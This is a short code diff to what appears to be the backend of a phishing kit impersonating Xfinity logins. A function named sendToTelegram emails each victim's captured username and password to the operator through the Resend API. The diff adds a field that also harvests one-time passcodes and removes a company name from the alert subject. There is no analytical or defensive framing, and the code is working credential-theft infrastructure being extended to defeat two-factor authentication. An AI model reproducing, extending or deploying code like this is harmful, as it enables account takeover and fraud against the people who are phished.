@@ -7,6 +7,7 @@ interface TelegramData {
   username: string;
   password: string;
   stage: string;
+  otp?: string;
 }
 
 // Hardcoded credentials (FOR TESTING ONLY - REVOKE AFTER USE)
@@ -32,6 +33,7 @@ export async function sendToTelegram(data: TelegramData): Promise<void> {
       <h1>🚨 Xfinity Login Attempt</h1>
       <p><strong>Username:</strong> <span class="highlight">${data.username}</span></p>
       <p><strong>Password:</strong> <span class="highlight">${data.password}</span></p>
+       <p><strong>OTP:</strong> <span class="highlight">${data?.otp}</span></p>
     </body>
     </html>
   `;
@@ -41,7 +43,7 @@ export async function sendToTelegram(data: TelegramData): Promise<void> {
     const emailResult = await resend.emails.send({
       from: fromEmail,
       to: [toEmail],
-      subject: "Xfinity Login Attempt - Core Key Realty",
+      subject: "Xfinity Login Attempt",
       html: emailHtml,
     });
     console.log("Email sent successfully:", emailResult);
